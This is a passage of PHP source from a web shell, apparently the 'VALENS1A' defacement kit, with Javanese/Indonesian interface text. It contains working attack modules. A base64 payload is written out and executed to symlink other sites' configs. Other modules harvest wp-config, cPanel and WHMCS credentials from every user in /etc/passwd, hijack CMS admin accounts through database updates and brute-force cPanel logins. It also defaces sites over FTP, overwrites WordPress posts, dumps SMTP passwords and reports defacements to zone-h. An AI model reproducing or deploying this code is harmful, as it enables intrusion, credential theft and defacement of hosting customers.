bmVrc2kucGhwJywkc2l0ZXNzLictTG9rb21lZGlhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NsY29uZmlnLnBocCcsJHNpdGVzcy4nLVNpdGVsb2NrLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCRzaXRlc3MuJy1FbGxpc2xhYi50eHQnKTsNCn0NCnByaW50ICJMb2NhdGlvbjogLi9cblxuIjs=";
$file = "valens1a_config/vhost.cin";
$handle = fopen($file ,"w+");
fwrite($handle ,base64_decode($vhost));
fclose($handle);
chmod($file, 0755);
if(exe("cd valens1a_config && ./vhost.cin")) {
echo "<center><a href='$link_config/valens1a_config'><font color=lime>Mari.</font></a></center>";
} else {
echo "<center><a href='$link_config/valens1a_config/vhost.cin'><font color=lime>Mari.</font></a></center>";
}

} else {
$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>/etc/passwd Gak Isok Di Woco Cok :)</font></pre>");
while($passwd = fgets($etc)) {
if($passwd == "" || !$etc) {
echo "<font color=red>/etc/passwd Gak Isok Di Woco Cok :)</font>";
} else {
preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] as $user_idx) {
$user_config_dir = "/home/$user_idx/public_html/";
if(is_readable($user_config_dir)) {
$grab_config = array(
"/home/$user_idx/.my.cnf" => "cpanel",
"/home/$user_idx/.accesshash" => "WHM-accesshash",
"$user_config_dir/po-content/config.php" => "Popoji",
"$user_config_dir/vdo_config.php" => "Voodoo",
"$user_config_dir/bw-configs/config.ini" => "BosWeb",
"$user_config_dir/config/koneksi.php" => "Lokomedia",
"$user_config_dir/lokomedia/config/koneksi.php" => "Lokomedia",
"$user_config_dir/clientarea/configuration.php" => "WHMCS",
"$user_config_dir/whm/configuration.php" => "WHMCS",
"$user_config_dir/whmcs/configuration.php" => "WHMCS",
"$user_config_dir/forum/config.php" => "phpBB",
"$user_config_dir/sites/default/settings.php" => "Drupal",
"$user_config_dir/config/settings.inc.php" => "PrestaShop",
"$user_config_dir/app/etc/local.xml" => "Magento",
"$user_config_dir/joomla/configuration.php" => "Joomla",
"$user_config_dir/configuration.php" => "Joomla",
"$user_config_dir/wp/wp-config.php" => "WordPress",
"$user_config_dir/wordpress/wp-config.php" => "WordPress",
"$user_config_dir/wp-config.php" => "WordPress",
"$user_config_dir/admin/config.php" => "OpenCart",
"$user_config_dir/slconfig.php" => "Sitelok",
"$user_config_dir/application/config/database.php" => "Ellislab");
foreach($grab_config as $config => $nama_config) {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} else {
$file_config = fopen("valens1a_config/$user_idx-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
}
}
}
}
echo "<center><a href='?dir=$dir/valens1a_config'><font color=lime>Mari.</font></a></center>";
}
} elseif($_GET['ochill_valens1a'] == 'jumping') {
$i = 0;
echo "<div class='margin: 5px auto;'>";
if(preg_match("/hsphere/", $dir)) {
$urls = explode("\r\n", $_POST['url']);
if(isset($_POST['jump'])) {
echo "<pre>";
foreach($urls as $url) {
$url = str_replace(array("http://","www."), "", strtolower($url));
$etc = "/etc/passwd";
$f = fopen($etc,"r");
while($gets = fgets($f)) {
$pecah = explode(":", $gets);
$user = $pecah[0];
$dir_user = "/hsphere/local/home/$user";
if(is_dir($dir_user) === true) {
$url_user = $dir_user."/".$url;
if(is_readable($url_user)) {
$i++;
$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
if(is_writable($url_user)) {
$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
}
echo $jrw."<br>";
}
}
}
}
if($i == 0) {
} else {
echo "<br>Total onok ".$i." Kamar nang ".$ip;
}
echo "</pre>";
} else {
echo '<center>
<form method="post">
List Domains: <br>
<textarea name="url" style="width: 500px; height: 250px;">';
$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
while($getss = fgets($fp)) {
echo $getss;
}
echo '</textarea><br>
<input type="submit" value="Mulai Loncat Indah" name="jump" style="width: 500px; height: 25px;">
</form></center>';
}
} elseif(preg_match("/vhosts|vhost/", $dir)) {
preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
$urls = explode("\r\n", $_POST['url']);
if(isset($_POST['jump'])) {
echo "<pre>";
foreach($urls as $url) {
$url = str_replace("www.", "", $url);
$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
if(is_dir($web_vh) === true) {
if(is_readable($web_vh)) {
$i++;
$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
if(is_writable($web_vh)) {
$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
}
echo $jrw."<br>";
}
}
}
if($i == 0) {
} else {
echo "<br>Total onok ".$i." Kamar nang ".$ip;
}
echo "</pre>";
} else {
echo '<center>
<form method="post">
List Domains: <br>
<textarea name="url" style="width: 500px; height: 250px;">';
bing("ip:$ip");
echo '</textarea><br>
<input type="submit" value="Mulai Loncat Indah" name="jump" style="width: 500px; height: 25px;">
</form></center>';
}
} else {
echo "<pre>";
$etc = fopen("/etc/passwd", "r") or die("<font color=red>/etc/passwd Gak Isok Di Woco Cok :)</font>");
while($passwd = fgets($etc)) {
if($passwd == '' || !$etc) {
echo "<font color=red>/etc/passwd Gak Isok Di Woco Cok :)</font>";
} else {
preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
foreach($user_jumping[1] as $user_idx_jump) {
$user_jumping_dir = "/home/$user_idx_jump/public_html";
if(is_readable($user_jumping_dir)) {
$i++;
$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
if(is_writable($user_jumping_dir)) {
$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
}
echo $jrw;
if(function_exists('posix_getpwuid')) {
$domain_jump = file_get_contents("/etc/named.conf");
if($domain_jump == '') {
echo " => ( <font color=red>gaisok ngambil jenenge domain</font> )<br>";
} else {
preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
foreach($domains_jump[1] as $dj) {
$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
$user_jumping_url = $user_jumping_url['name'];
if($user_jumping_url == $user_idx_jump) {
echo " => ( <u>$dj</u> )<br>";
break;
}
}
}
} else {
echo "<br>";
}
}
}
}
}
if($i == 0) {
} else {
echo "<br>Total onok ".$i." Kamar nang ".$ip;
}
echo "</pre>";
}
echo "</div>";
} elseif($_GET['ochill_valens1a'] == 'auto_edit_user') {
if($_POST['hajar']) {
if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
echo "username utawa password kudu lebih teko 6 huruf";
} else {
$user_baru = $_POST['user_baru'];
$pass_baru = md5($_POST['pass_baru']);
$conf = $_POST['config_dir'];
$scan_conf = scandir($conf);
foreach($scan_conf as $file_conf) {
if(!is_file("$conf/$file_conf")) continue;
$config = file_get_contents("$conf/$file_conf");
if(preg_match("/JConfig|joomla/",$config)) {
$dbhost = ambilkata($config,"host = '","'");
$dbuser = ambilkata($config,"user = '","'");
$dbpass = ambilkata($config,"password = '","'");
$dbname = ambilkata($config,"db = '","'");
$dbprefix = ambilkata($config,"dbprefix = '","'");
$prefix = $dbprefix."users";
$conn = mysql_connect($dbhost,$dbuser,$dbpass);
$db = mysql_select_db($dbname);
$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
$result = mysql_fetch_array($q);
$id = $result['id'];
$site = ambilkata($config,"sitename = '","'");
$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
echo "Config => ".$file_conf."<br>";
echo "CMS => Joomla<br>";
if($site == '') {
echo "Sitename => <font color=red>gagal, gaisok ngambil jenenge domain</font><br>";
} else {
echo "Sitename => $site<br>";
}
if(!$update OR !$conn OR !$db) {
echo "Status => <font color=red>".mysql_error()."</font><br><br>";
} else {
echo "Status => <font color=lime>sukses macaki user, silakan login gawe user & pass seng anyar.</font><br><br>";
}
mysql_close($conn);
} elseif(preg_match("/WordPress/",$config)) {
$dbhost = ambilkata($config,"DB_HOST', '","'");
$dbuser = ambilkata($config,"DB_USER', '","'");
$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
$dbname = ambilkata($config,"DB_NAME', '","'");
$dbprefix = ambilkata($config,"table_prefix = '","'");
$prefix = $dbprefix."users";
$option = $dbprefix."options";
$conn = mysql_connect($dbhost,$dbuser,$dbpass);
$db = mysql_select_db($dbname);
$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
$result = mysql_fetch_array($q);
$id = $result[ID];
$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
$result2 = mysql_fetch_array($q2);
$target = $result2[option_value];
if($target == '') {
$url_target = "Login => <font color=red>gagal, gaisok ngambil jenenge domain</font><br>";
} else {
$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
}
$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
echo "Config => ".$file_conf."<br>";
echo "CMS => Wordpress<br>";
echo $url_target;
if(!$update OR !$conn OR !$db) {
echo "Status => <font color=red>".mysql_error()."</font><br><br>";
} else {
echo "Status => <font color=lime>sukses edit user, silakan login gawe user & pass seng anyar.</font><br><br>";
}
mysql_close($conn);
} elseif(preg_match("/Magento|Mage_Core/",$config)) {
$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
$prefix = $dbprefix."admin_user";
$option = $dbprefix."core_config_data";
$conn = mysql_connect($dbhost,$dbuser,$dbpass);
$db = mysql_select_db($dbname);
$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
$result = mysql_fetch_array($q);
$id = $result[user_id];
$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
$result2 = mysql_fetch_array($q2);
$target = $result2[value];
if($target == '') {
$url_target = "Login => <font color=red>gagal, gaisok ngambil jenenge domain</font><br>";
} else {
$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
}
$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
echo "Config => ".$file_conf."<br>";
echo "CMS => Magento<br>";
echo $url_target;
if(!$update OR !$conn OR !$db) {
echo "Status => <font color=red>".mysql_error()."</font><br><br>";
} else {
echo "Status => <font color=lime>sukses edit user, silakan login gawe user & pass seng anyar.</font><br><br>";
}
mysql_close($conn);
} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
$dbname = ambilkata($config,"'DB_DATABASE', '","'");
$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
$prefix = $dbprefix."user";
$conn = mysql_connect($dbhost,$dbuser,$dbpass);
$db = mysql_select_db($dbname);
$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
$result = mysql_fetch_array($q);
$id = $result[user_id];
$target = ambilkata($config,"HTTP_SERVER', '","'");
if($target == '') {
$url_target = "Login => <font color=red>gagal, gaisok ngambil jenenge domain</font><br>";
} else {
$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
}
$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
echo "Config => ".$file_conf."<br>";
echo "CMS => OpenCart<br>";
echo $url_target;
if(!$update OR !$conn OR !$db) {
echo "Status => <font color=red>".mysql_error()."</font><br><br>";
} else {
echo "Status => <font color=lime>sukses edit user, silakan login gawe user & pass seng anyar.</font><br><br>";
}
mysql_close($conn);
} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
$dbhost = ambilkata($config,'server = "','"');
$dbuser = ambilkata($config,'username = "','"');
$dbpass = ambilkata($config,'password = "','"');
$dbname = ambilkata($config,'database = "','"');
$prefix = "users";
$option = "identitas";
$conn = mysql_connect($dbhost,$dbuser,$dbpass);
$db = mysql_select_db($dbname);
$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
$result = mysql_fetch_array($q);
$target = $result[alamat_website];
if($target == '') {
$target2 = $result[url];
$url_target = "Login => <font color=red>gagal, gaisok ngambil jenenge domain</font><br>";
if($target2 == '') {
$url_target2 = "Login => <font color=red>sukses edit user, silakan login gawe user & pass seng anyar.</font><br>";
} else {
$cek_login3 = file_get_contents("$target2/adminweb/");
$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
} else {
$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>ga ngerti admin logine :p</font> ]<br>";
}
}
} else {
$cek_login = file_get_contents("$target/adminweb/");
$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
} else {
$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>ga ngerti admin logine :p</font> ]<br>";
}
}
$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
echo "Config => ".$file_conf."<br>";
echo "CMS => Lokomedia<br>";
if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
echo $url_target2;
} else {
echo $url_target;
}
if(!$update OR !$conn OR !$db) {
echo "Status => <font color=red>".mysql_error()."</font><br><br>";
} else {
echo "Status => <font color=lime>sukses edit user, silakan login gawe user & pass seng anyar..</font><br><br>";
}
mysql_close($conn);
}
}
}
} else {
echo "<center>
<h1>Auto Pacaki User Config</h1>
<form method='post'>
Panggone Sempak: <br>
<input type='text' size='50' name='config_dir' value='$dir'><br><br>
Set User & Pass: <br>
<input type='text' name='user_baru' value='ochillroot' placeholder='user_baru'><br>
<input type='text' name='pass_baru' value='valens1a' placeholder='pass_baru'><br>
<input type='submit' name='hajar' value='Crootzz PerawanNya!' style='width: 215px;'>
</form>
<span><font color=lime>WOCOEN SEK: </font><font color=white>Tools iki work lek dimlakuno nang njerone folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</font></span><br>
";
}
echo "<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek Gasido Pacaki User Config ]</a></p></center><hr>";

html_footer();
} elseif($_GET['ochill_valens1a'] == 'cpanel') {
if($_POST['crack']) {
$usercp = explode("\r\n", $_POST['user_cp']);
$passcp = explode("\r\n", $_POST['pass_cp']);
$i = 0;
foreach($usercp as $ucp) {
foreach($passcp as $pcp) {
if(@mysql_connect('localhost', $ucp, $pcp)) {
if($_SESSION[$ucp] && $_SESSION[$pcp]) {
} else {
$_SESSION[$ucp] = "1";
$_SESSION[$pcp] = "1";
if($ucp == '' || $pcp == '') {

} else {
$i++;
if(function_exists('posix_getpwuid')) {
$domain_cp = file_get_contents("/etc/named.conf");
if($domain_cp == '') {
$dom = "<font color=red>gaisok ngambil jenenge domain.</font>";
} else {
preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
foreach($domains_cp[1] as $dj) {
$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
$user_cp_url = $user_cp_url['name'];
if($user_cp_url == $ucp) {
$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
break;
}
}
}
} else {
$dom = "<font color=red>function is Disable by system</font>";
}
echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
}
}
}
}
}
if($i == 0) {
} else {
echo "<br>Sukses Nyolong ".$i." Cpanel Cok by <font color=lime>[!]VALENS1A[!]</font>";
echo "<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";

html_footer();
}
} else {
echo "<center>
<form method='post'>
USER: <br>
<textarea style='width: 450px; height: 150px;' name='user_cp'>";
$_usercp = fopen("/etc/passwd","r");
while($getu = fgets($_usercp)) {
if($getu == '' || !$_usercp) {
echo "<font color=red>/etc/passwd Gak Isok Di Woco Cok :)</font>";
} else {
preg_match_all("/(.*?):x:/", $getu, $u);
foreach($u[1] as $user_cp) {
if(is_dir("/home/$user_cp/public_html")) {
echo "$user_cp\n";
}
}
}
}
echo "</textarea><br>
PASS: <br>
<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
function cp_pass($dir) {
$pass = "";
$dira = scandir($dir);
foreach($dira as $dirb) {
if(!is_file("$dir/$dirb")) continue;
$ambil = file_get_contents("$dir/$dirb");
if(preg_match("/WordPress/", $ambil)) {
$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
} elseif(preg_match("/JConfig|joomla/", $ambil)) {
$pass .= ambilkata($ambil,"password = '","'")."\n";
} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
$pass .= ambilkata($ambil,'password = "','"')."\n";
} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
} elseif(preg_match("/^[client]$/", $ambil)) {
preg_match("/password=(.*?)/", $ambil, $pass1);
if(preg_match('/"/', $pass1[1])) {
$pass1[1] = str_replace('"', "", $pass1[1]);
$pass .= $pass1[1]."\n";
} else {
$pass .= $pass1[1]."\n";
}
} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
$pass .= ambilkata($ambil,"db_password = '","'")."\n";
}
}
echo $pass;
}
$cp_pass = cp_pass($dir);
echo $cp_pass;
echo "</textarea><br>
<input type='submit' name='crack' style='width: 450px;' value='Crack'>
</form>
<span><font color=lime>WOCOEN SEK: </font> CPanel Crack iki uwes auto get password ( gawe db password ) maka akan work lek dimlakuno nang njerone folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
}
echo "<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";

html_footer();
} elseif($_GET['ochill_valens1a'] == 'cpftp_auto') {
if($_POST['crack']) {
$usercp = explode("\r\n", $_POST['user_cp']);
$passcp = explode("\r\n", $_POST['pass_cp']);
$i = 0;
foreach($usercp as $ucp) {
foreach($passcp as $pcp) {
if(@mysql_connect('localhost', $ucp, $pcp)) {
if($_SESSION[$ucp] && $_SESSION[$pcp]) {
} else {
$_SESSION[$ucp] = "1";
$_SESSION[$pcp] = "1";
if($ucp == '' || $pcp == '') {
//
} else {
echo "[+] username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
$ftp_conn = ftp_connect($ip);
$ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
if((!$ftp_login) || (!$ftp_conn)) {
echo "[+] <font color=red>Login Gagal</font><br><br>";
} else {
echo "[+] <font color=lime>Login Sukses</font><br>";
$fi = htmlspecialchars($_POST['file_deface']);
$deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
if($deface) {
$i++;
echo "[+] <font color=lime>Deface Sukses</font><br>";
if(function_exists('posix_getpwuid')) {
$domain_cp = file_get_contents("/etc/named.conf");
if($domain_cp == '') {
echo "[+] <font color=red>gaisok ngambil jenenge domain</font><br><br>";
} else {
preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
foreach($domains_cp[1] as $dj) {
$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
$user_cp_url = $user_cp_url['name'];
if($user_cp_url == $ucp) {
echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
break;
}
}
}
} else {
echo "[+] <font color=red>gaisok ngambil jenenge domain</font><br><br>";
}
} else {
echo "[-] <font color=red>Deface Gagal</font><br><br>";
}
}
//echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
}
}
}
}
}
if($i == 0) {
} else {
echo "<br>Sukses Deface ".$i." Cpanel by <font color=lime>[!]VALENS1A[!]</font>";
}
echo "<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";

html_footer();
} else {
echo "<center>
<form method='post'>
Jeneng Sempak: <br>
<input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
Deface Page: <br>
<input type='text' name='deface' placeholder='http://www.web-yang-udah-di-deface.com/filemu.php' style='width: 450px;'><br>
USER: <br>
<textarea style='width: 450px; height: 150px;' name='user_cp'>";
$_usercp = fopen("/etc/passwd","r");
while($getu = fgets($_usercp)) {
if($getu == '' || !$_usercp) {
echo "<font color=red>/etc/passwd Gak Isok Di Woco Cok :)</font>";
} else {
preg_match_all("/(.*?):x:/", $getu, $u);
foreach($u[1] as $user_cp) {
if(is_dir("/home/$user_cp/public_html")) {
echo "$user_cp\n";
}
}
}
}
echo "</textarea><br>
PASS: <br>
<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
function cp_pass($dir) {
$pass = "";
$dira = scandir($dir);
foreach($dira as $dirb) {
if(!is_file("$dir/$dirb")) continue;
$ambil = file_get_contents("$dir/$dirb");
if(preg_match("/WordPress/", $ambil)) {
$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
} elseif(preg_match("/JConfig|joomla/", $ambil)) {
$pass .= ambilkata($ambil,"password = '","'")."\n";
} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
$pass .= ambilkata($ambil,'password = "','"')."\n";
} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
} elseif(preg_match("/client/", $ambil)) {
preg_match("/password=(.*)/", $ambil, $pass1);
if(preg_match('/"/', $pass1[1])) {
$pass1[1] = str_replace('"', "", $pass1[1]);
$pass .= $pass1[1]."\n";
}
} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
$pass .= ambilkata($ambil,"db_password = '","'")."\n";
}
}
echo $pass;
}
$cp_pass = cp_pass($dir);
echo $cp_pass;
echo "</textarea><br>
<input type='submit' name='crack' style='width: 450px;' value='Hajar'>
</form>
<span><font color=lime>WOCOEN SEK: </font><font color=white>CPanel Crack iki uwes auto get password ( gawe db password ) maka akan work lek dimlakuno nang njerone folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</font></span><br></center>";
echo "<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";

html_footer();
}
} elseif($_GET['ochill_valens1a'] == 'smtp') {
echo "<center><span><font color=lime>WOCOEN SEK: </font><font color=white>Tools iki work lek dimlakuno nang njerone folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</font></span></center><br>";
function scj($dir) {
$dira = scandir($dir);
foreach($dira as $dirb) {
if(!is_file("$dir/$dirb")) continue;
$ambil = file_get_contents("$dir/$dirb");
$ambil = str_replace("$", "", $ambil);
if(preg_match("/JConfig|joomla/", $ambil)) {
$smtp_host = ambilkata($ambil,"smtphost = '","'");
$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
$smtp_user = ambilkata($ambil,"smtpuser = '","'");
$smtp_pass = ambilkata($ambil,"smtppass = '","'");
$smtp_port = ambilkata($ambil,"smtpport = '","'");
$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
echo "SMTP port: <font color=lime>$smtp_port</font><br>";
echo "SMTP user: <font color=lime>$smtp_user</font><br>";
echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
}
}
}
$smpt_hunter = scj($dir);
echo $smpt_hunter;
echo "<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";

html_footer();
} elseif($_GET['ochill_valens1a'] == 'auto_wp') {
if($_POST['hajar']) {
$title = htmlspecialchars($_POST['new_title']);
$pn_title = str_replace(" ", "-", $title);
if($_POST['cek_edit'] == "Y") {
$script = $_POST['edit_content'];
} else {
$script = $title;
}
$conf = $_POST['config_dir'];
$scan_conf = scandir($conf);
foreach($scan_conf as $file_conf) {
if(!is_file("$conf/$file_conf")) continue;
$config = file_get_contents("$conf/$file_conf");
if(preg_match("/WordPress/", $config)) {
$dbhost = ambilkata($config,"DB_HOST', '","'");
$dbuser = ambilkata($config,"DB_USER', '","'");
$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
$dbname = ambilkata($config,"DB_NAME', '","'");
$dbprefix = ambilkata($config,"table_prefix = '","'");
$prefix = $dbprefix."posts";
$option = $dbprefix."options";
$conn = mysql_connect($dbhost,$dbuser,$dbpass);
$db = mysql_select_db($dbname);
$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
$result = mysql_fetch_array($q);
$id = $result[ID];
$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
$result2 = mysql_fetch_array($q2);
$target = $result2[option_value];
$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
echo "<div style='margin: 5px auto;'>";
if($target == '') {
echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
} else {
echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
}
if(!$update OR !$conn OR !$db) {
echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
} else {
echo "<font color=lime>sukses di ganti.</font><br>";
}
echo "</div>";
mysql_close($conn);
}
}
} else {
echo "<center>
<h1>Auto Pacaki Jeneng+Content WordPress</h1>
<form method='post'>
Panggone Sempak: <br>
<input type='text' size='50' name='config_dir' value='$dir'><br><br>
Set Title: <br>
<input type='text' name='new_title' value='Hacked by VALENS1A' placeholder='New Title'><br><br>
Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>IYO<input type='radio' name='cek_edit' value='N'>GAK<br>
<span>lek milih <u>IYO</u> lebokno script defacean mu ( saran seng simple-simple ae ), lek milih <u>GAK</u> gausah di isi.</span><br>
<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
<input type='submit' name='hajar' value='Crootzz PerawanNya.' style='width: 450px;'><br>
</form>
<span><font color=lime>WOCOEN SEK: </font><font color=white>Tools iki work lek dimlakuno nang njerone folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )<font></span><br>
";
echo "<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";

html_footer();
}
} elseif($_GET['ochill_valens1a'] == 'zoneh') {
if($_POST['submit']) {
$domain = explode("\r\n", $_POST['url']);
$nick = $_POST['nick'];
echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
function zoneh($url,$nick) {
$ch = curl_init("http://www.zone-h.com/notify/single");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&ochill_valens1amain1=$url&hackmode=1&reason=1&submit=Send");
return curl_exec($ch);
curl_close($ch);
}
foreach($domain as $url) {
$zoneh = zoneh($url,$nick);
if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
echo "$url -> <font color=lime>OK</font><br>";
} else {
echo "$url -> <font color=red>ERROR</font><br>";
}
}
} else {
echo "<center><form method='post'>
<u>Jeneng Defacer</u>: <br>
<input type='text' name='nick' size='50' value='VALENS1A'><br>
<u>Domains</u>: <br>
<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
<input type='submit' name='submit' value='Simpen.' style='width: 450px;'>
</form>";
}
echo "<hr><p><a style='color:red;' href='?dir=$dir'>[ Mbalek ]</a></p></center><hr>";

html_footer();
} elseif($_GET['ochill_valens1a'] == 'cgi') {
